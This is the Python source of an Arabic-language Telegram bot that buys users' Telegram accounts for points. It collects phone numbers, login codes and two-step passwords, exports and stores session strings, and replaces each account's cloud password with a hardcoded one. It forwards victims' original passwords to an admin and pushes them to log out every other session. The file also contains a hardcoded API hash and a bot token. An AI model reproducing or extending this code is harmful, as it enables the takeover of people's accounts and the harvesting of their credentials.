from pyromod import listen
from pyrogram.types import Message
from pyrogram import Client, filters
from pyrogram import enums
from pyrogram import Client as temp
import json, time , os
from pyrogram import types as typ
from asyncio.exceptions import TimeoutError
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pyrogram.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
from kvsqlite.sync import Client as uu
from telethon.sync import TelegramClient, events, Button
from telethon import TelegramClient, functions as functele
from telethon.errors.rpcerrorlist import UserDeactivatedBanError
from telethon.sessions import StringSession
from telethon.tl.types import InputPeerUser, InputPeerChannel
from apis import *
db = uu('dbs/elhakem.ss', 'rshq')
def adds(session: str, phone: str)-> bool:
    d = db.get('accounts')
    d.append({"s":session, 'phone': phone})
    db.set("accounts", d)
    return True


admin = 1027829465
app = Client('::memory::', in_memory=True, api_hash='4f9f53e287de541cf0ed81e12a68fa3b', api_id=22256614, lang_code="ar", bot_token="6745932210:AAG5eVb-fOAN3HB1FLv3MUBezJbuwjEtvK8")
print(app)
    
@app.on_message(filters.private & filters.regex("^/start$"), group=1)
async def startm(app, msg):
    user_id = msg.from_user.id
    if db.get("ban_list") is None:
        db.set('ban_list', [])
        pass
    if user_id == admin:
        rk = "• مرحبا بك عزيزي الادمن "
        keys = mk(
            [
                [btn(text='تعيين سعر تسليم الرقم', callback_data='pci')],
                [btn(text='حظر دولة', callback_data='ban_c')],
                [btn(text='رفع حظر دولة', callback_data='unban_c')]
            ]
        )
        await msg.reply(rk, reply_markup=keys,quote=True)
    if user_id in db.get("ban_list"):
        return
    if db.exists(f"user_{user_id}"):
        coin = int(db.get(f'user_{user_id}')['coins'])
        num = int(db.get(f'num_{user_id}')) if db.exists(f'num_{user_id}') else 0
        keyboard = [
            [KeyboardButton(f"نقاطك : {coin}")],
            [KeyboardButton("تسليم حساب جديد")],
            [KeyboardButton("شروط الاستخدام"), KeyboardButton("شرح البوت")]
        ]
        keys = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        rk = f'''أهلا بك في بوت تسليم الحسابات الخاص ببوت طلباتكم

سيتم التحقق من الرقم، وسيصلك الرصيد فورياً

#تحذير لا تقم بتسجيل حسابك الشخصي ونحن غير مسؤولين عن استرداده'''
        await msg.reply(rk, reply_markup=keys,quote=True)
    else:
        keys = mk(
            [
                [btn(text='اضغط هنا للتحقق', url='https://t.me/TasslemXbot?start=1027829465')], 
            ]
        )
        rk =f'''︎• عذرا عزيزي لم يكتشف نظامنا تسجيل دخولك عبر بوت طلباتكم
            
• رجاء قم بالدخول وتسجيل حسابك اولا من خلال الزر بالاسفل 📥'''
        await msg.reply(rk, reply_markup=keys,quote=True)
        
@app.on_message(filters.text)
async def ec(app, message):
    markup1 = [
            [KeyboardButton("رجوع")]
        ]
    markup = ReplyKeyboardMarkup(markup1, resize_keyboard=True)
    user_id = message.from_user.id
    if message.text == "تسليم حساب جديد": 
        await generate_session(app, message)
    if message.text =="شرح البوت":
        rk =f'''تسليم الحسابات للبوت يتم من خلال ارسال رقم الهاتف متبوعاً برمز الدولة :

• مثال :
+201000000000
        
• بعد ارسال الرقم إلى البوت سيتم إرسال الرمز الى حسابك على تليجرام ان كان مسجلا او عبر رسالة sms ان لم يكن مسجلا

• ملاحظة اخرى تأكد من عدد الجلسات الموجودة بالحساب وقم بانهاء جميع الجلسات حتى لا تواجهك اي مشكلة اثناء تسجيل الحساب

• بعد انهائك لجميع الجلسات عليك تسجيل الخروج من الحساب ثم الضغط علي زر تحقق حتي تحصل علي رصيدك بداخل البوت '''
        await message.reply(rk, reply_markup=markup,quote=True)
    if message.text =="رجوع":
        coin = int(db.get(f'user_{user_id}')['coins'])
        num = int(db.get(f'num_{user_id}')) if db.exists(f'num_{user_id}') else 0
        keyboard = [
            [KeyboardButton(f"نقاطك : {coin}")],
            [KeyboardButton("تسليم حساب جديد")],
            [KeyboardButton("شروط الاستخدام"), KeyboardButton("شرح البوت")]
        ]
        keys = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        rk = f'''أهلا بك في بوت تسليم الحسابات الخاص ببوت ستارز

سيتم التحقق من الرقم، وسيصلك الرصيد فورياً

#تحذير لا تقم بتسجيل حسابك الشخصي ونحن غير مسؤولين عن استرداده'''
        await message.reply(rk, reply_markup=keys,quote=True)
    if message.text == "شروط الاستخدام":
        rk =f'''• شروط استخدام بوت تسليم طلباتكم 📞*

• البوت مخصص لتسليم حسابات تليجرام فقط الي البوت تلقائيا ولا يوجد.اي تدخل بشرى

• في حالة ارتكاب الاخطاء المقصودة او اساءة الاستخدام سيتم حظرك تلقائيا من بوت طلباتكم وبوت التسليم ايضا وسيتم ارسال بلاغ للمطور

• تم إضافة بعض القيود :
- لا يمكنك تسليم أرقام بعض الدول العربية'''
        await message.reply(rk, reply_markup=markup,quote=True)
async def generate_session(app, message):
    password = None 
    phone = None
    code = None
    msg = message
    api_id = 22256614
    api_hash = "4f9f53e287de541cf0ed81e12a68fa3b"
    markup1 = [
        [KeyboardButton("رجوع")]
    ]
    markup = ReplyKeyboardMarkup(markup1, resize_keyboard=True)
    ask = await app.ask(message.chat.id,"""☎️ يرجى إرسال الرقم الذي تريد تسليمه للبوت :

⚠️ ملاحظة يجب ارسال رقم الهاتف متبوعا برمز الدولة :

• مثال :
+201000000000
        
• بعد ارسال الرقم إلى البوت سيتم إرسال الرمز الى حسابك على تليجرام ان كان مسجلا او عبر رسالة sms ان لم يكن مسجلا

• بعد انتهاء العملية بنجاح سيتم اضافة الرقم لقسم الخاص في حسابك ببوت طلباتكم""", reply_markup=markup)
    if "+" not in ask.text:
        await message.reply("• رجاء ارسل رقم الهاتف مع رمز الدولة ")
        return
    try:
        phone = str(ask.text)
    except:
        return
    c = None
    calling_codes = db.get("codes") if db.exists("codes") else []
    for i in calling_codes:
        mss = ask.text.replace("+","")
        if mss.startswith(i):
            rk = "• عذرا ، هذه الدولة محظورة من البوت ، برجاء تسليم رقم مختلف"
            await message.reply(rk, reply_markup=markup,quote=True)
            return
    
    client_1 = Client(name="user", api_id=api_id, api_hash=api_hash,lang_code="ar", in_memory=True)
    await client_1.connect()
    try:
        code = await client_1.send_code(phone)
    except (ApiIdInvalid,):
        await message.reply("• هناك مشكلة في البوت حاليا ، رجاء  قم بابلاغ المطور بهذه المشكلة",quote=True)
        return
    except (PhoneNumberInvalid,):
        await message.reply(f"• حدث خطا في ارسال رمز التحقق الي رقم الهاتف {ask.text}\n• رجاء اعد محاولة تسجيل الرقم بشكل صحيح",quote=True)
        return
    try:            
        code_e = await app.ask(message.chat.id, f"• تم ارسال كود التحقق الي رقم الهاتف {ask.text}\n\n• مثال : \n`12345`", timeout=20000)
            
    except TimeoutError:
        await msg.reply('• استغرقت العملية وقت اطول من اللازم ، رجاء اعادة تسجيل الرقم من جديد')
        return
    code_r = code_e.text.replace(" ",'')
    try:
        await client_1.sign_in(phone, code.phone_code_hash, code_r)
        ses = await client_1.export_session_string()
        await client_1.enable_cloud_password("zainzain")
        user_id = msg.from_user.id
        x = await fake_num(ses)
        db.set(f"{ask.text}", ses)
        keys = mk(
            [
                [btn(text='اضغط هنا للتحقق', callback_data=f'ck:{ask.text}')], 
            ]
        )
        if x is True:
            adds(ses,phone)
            try:
                numb = db.get("price_number") if db.exists("price_number") else 1000
                await msg.reply(f"• تم تسجيل الدخول الي حسابك بنجاح ✅\n\n• الخطوة التالية هي : حذف جميع الجلسات الموجودة في حسابك ماعدا جلسة البوت فقط \n\n• ثم قم بتسجيل الخروج من الحساب واضغط علي كلمة تحقق لتحصل علي {numb} نقطة",reply_to_message_id=message.id, reply_markup=keys)
                await app.send_message(admin, f"• قام {message.from_user.mention} | `{message.from_user.id}` باضافة رقم الي البوت الخاص بك \n\n• الرقم : {ask.text}\n• رمز التحقق بخطوتين : لا يوجد")
            except:
                print(message)
        else:
            return
        
    except (PhoneCodeInvalid,):
        await msg.reply("• لقد ادخلت الكود بشكل خاطئ ❌",quote=True)
        return
    except (PhoneCodeExpired):
        await msg.reply("• انتهت صلاحية هذا الكود ❌",quote=True)
        return
    except (SessionPasswordNeeded):
        try:
            pas_ask = await app.ask(message.chat.id,"• تم التحقق من صحة الرمز\n\n• ارسل الان رمز التحقق بخطوتين لمتابعة التسجيل",timeout=20000)
        except:
            return
        password = pas_ask.text
        try:
            await client_1.check_password(password=password)
        except:
            await msg.reply("• فشل في تسجيل الدخول ❌\n\n• رمز التحقق بخطوتين غير صحيح",quote=True)
            return
        ses = await client_1.export_session_string()
        user_id = msg.from_user.id
        x = await fake_num(ses)
        db.set(f"{ask.text}", ses)
        keys = mk(
            [
                [btn(text='اضغط هنا للتحقق', callback_data=f'ck:{ask.text}')], 
            ]
        )
        if x is True:
            adds(ses,phone)
            try:
                await client_1.change_cloud_password(f"{password}", "zainzain")
                numb = db.get("price_number") if db.exists("price_number") else 1000
                await msg.reply(f"• تم تسجيل الدخول الي حسابك بنجاح ✅\n\n• الخطوة التالية هي : حذف جميع الجلسات الموجودة في حسابك ماعدا جلسة البوت فقط \n\n• ثم قم بتسجيل الخروج من الحساب واضغط علي كلمة تحقق لتحصل علي {numb} نقطة",reply_to_message_id=message.id, reply_markup=keys)
                await app.send_message(admin, f"• قام {message.from_user.mention} | `{message.from_user.id}` باضافة رقم الي البوت الخاص بك \n\n• الرقم : {ask.text}\n• رمز التحقق بخطوتين : {pas_ask.text}")
            except:
                print(message)
        else:
            return
@app.on_callback_query(filters.regex('^ban_c$'))
async def ban_c(app, call):
    calling_codes = db.get("codes") if db.exists("codes") else []
    ask = await app.ask(call.message.chat.id,"• ارسل رمز الدولة الي تريد حظرها")
    code = ask.text.replace("+", "")
    if code not in calling_codes:
        calling_codes.append(code)
        db.set("codes", calling_codes)
        await app.send_message(text="• تم حظر الدولة بنجاح ✅", chat_id=call.message.chat.id)
    else:
        await app.send_message(text="• هذه الدولة محظورة بالفعل", chat_id=call.message.chat.id)
        
@app.on_callback_query(filters.regex('^unban_c$'))
async def ban_c(app, call):
    calling_codes = db.get("codes") if db.exists("codes") else []
    ask = await app.ask(call.message.chat.id,"• ارسل رمز الدولة الي تريد رفع الحظر عنها")
    code = ask.text.replace("+", "")
    if code not in calling_codes:
        await app.send_message(text="• هذه الدولة غير محظورة", chat_id=call.message.chat.id)
    else:
        calling_codes.remove(code)
        db.set("codes", calling_codes)
        await app.send_message(text="• تم رفع الحظر عن هذه الدولة بنجاح ✅", chat_id=call.message.chat.id)

@app.on_callback_query(filters.regex('^pci$'))
async def pci(app, call):
    numb = db.get("price_number") if db.exists("price_number") else 1000
    ask = await app.ask(call.message.chat.id,f"• ارسل عدد النقاط التي سيحصل عليها المستخدم من تسليم الرقم\n\n• السعر الحالي : {numb}")
    try:
        num = int(ask.text)
    except:
        await app.send_message(text="• رجاء ارسل رقم فقط", chat_id=call.message.chat.id)
        return
    db.set("price_number", num)
    await app.send_message(text="• تم تعيين السعر بنجاح ✅", chat_id=call.message.chat.id)
@app.on_callback_query(filters.regex('^mina$'))
async def clear(app, call):
    if not db.exists('accounts'):
        await call.edit_message_text('• لا يوجد اي ارقام في البوت الخاص بك')
        return
    
    sessions = db.get('accounts')
    if len(sessions) < 1:
        await call.edit_message_text('لا يوجد اي ارقام في البوت الخاص بك')
        return
    
    deleted_count = 0
    working_count = 0
    print(len(sessions))
    
    await call.answer('• برجاء الانتظار \n• جارى بدء عملية التنظيف', show_alert=True)
    
    updated_sessions = []
    
    for session in sessions:
        sessio = session['s']
        phon = session['phone']
        try:
            client = temp('::memory::', api_id=22256614, api_hash='4f9f53e287de541cf0ed81e12a68fa3b', in_memory=True, session_string=sessio)
        except:
            continue
        
        try:
            await client.start()
        except:
            deleted_count += 1
            continue
        
        try:
            await client.get_me()
            working_count += 1
            updated_sessions.append({"s":sessio, 'phone': phon})
    
        except:
            deleted_count += 1
    db.set("accounts", updated_sessions)
    await call.edit_message_text(f'• تم انتهاء فحص وتنظيف الحسابات ♻️\n\n• الحسابات التي تعمل ✅ : {working_count} \n\n• الحسابات التي لا تعمل ❌ : {deleted_count}')
    return

@app.on_message(filters.private & filters.regex("^/mina$"), group=2)
async def startm(app, msg):
    user_id = msg.from_user.id
    if db.get("ban_list") is None:
        db.set('ban_list', [])
        pass
    if user_id in db.get("ban_list"):
        return
    if db.exists(f"user_{user_id}"):
        keys = mk(
            [
                [btn(text=f'تنظيف', callback_data='clear')],
            ]
        )
        rk = f'''•☎️] مرحبا بك في قسم تنظيف الحسابات︎'''
        await msg.reply(rk, reply_markup=keys,quote=True)
@app.on_callback_query()
async def clears(app, call):
    cid, data, mid = call.from_user.id, call.data, call.message.id
    if call.data.startswith('ck:'):
        sess = call.data.split(':')[1]
        await app.send_message(text="• انتظر لحظة جارى التحقق ...", chat_id=cid)
        ses = db.get(f"{sess}")
        client = temp('::memory::', api_id=22256614, api_hash='4f9f53e287de541cf0ed81e12a68fa3b', in_memory=True, session_string=ses)
        try:
            await client.start()
        except:
            await app.send_message(text="• حدث خطا ما رجاء اعادة تسجيل الرقم مرة اخرى", chat_id=cid)
            return
        x = await count_ses(ses)
        mkk = isinstance(x, list)
        if mkk is False:
            await app.send_message(text=f"• حدث خطا ما رجاء اعادة تسجيل الرقم مرة اخرى\n\n{x}", chat_id=cid)
            return
        xv = len(x)
        if xv == 1:
            if db.exists(f"num_{cid}_{sess}"):
                return
            await app.delete_messages(cid, mid)
            numb = db.get("price_number") if db.exists("price_number") else 1000
            joo = db.get(f"user_{cid}")
            joo['coins'] = joo['coins'] + int(numb)
            if db.exists(f"num_{cid}_{sess}"):
                return
            db.set(f"user_{cid}", joo)
            db.set(f"num_{cid}_{sess}", True)
            await app.send_message(text=f"• تهانينا ، تم تسجيل الرقم بنجاح ✅، تم اضافة {numb} نقطة الي رصيدك في بوت الفراعنة", chat_id=cid)
            await app.send_message(admin, f"• قام @{call.from_user.username} | `{call.from_user.id}` باضافة رقم الي البوت الخاص بك \n\n• الرقم : {sess}\n• وحصل علي 1000 نقطة ")
        else:
            bm = ""
            for i in x:
                bm += f"• {i}\n"
            xxx = f"""فشل التحقق من الحساب

كلمة المرور : تم التحقق من كلمة المرور بنجاح ✅
الجلسات النشطة : 
لم تقم بتسجيل الخروج من الجلسات النشطة ❌
قم بتسجيل الخروج من جميع الجلسات ما عدا جلسة البوت التي تحمل
        
عدد الجلسات الحالية : {len(x)}

الأجهزة التي يجب تسجيل الخروج منها :{bm}
للتحقق مرة أخرى اضغط علي الزر ادناه 📥"""
            xnxx = xxx.replace("• PC 64bit","")
            keys = mk(
                [
                    [btn(text='اضغط هنا للتحقق', callback_data=f'{data}')], 
                ]
            )
            await app.delete_messages(cid, mid)
            await app.send_message(text=xnxx, chat_id=cid, reply_markup=keys)

async def reg_phone2(app, message, cid):
    await app.send_message(text="• هذا القسم غير متاح لك", chat_id=cid)
    return

            
app.run()


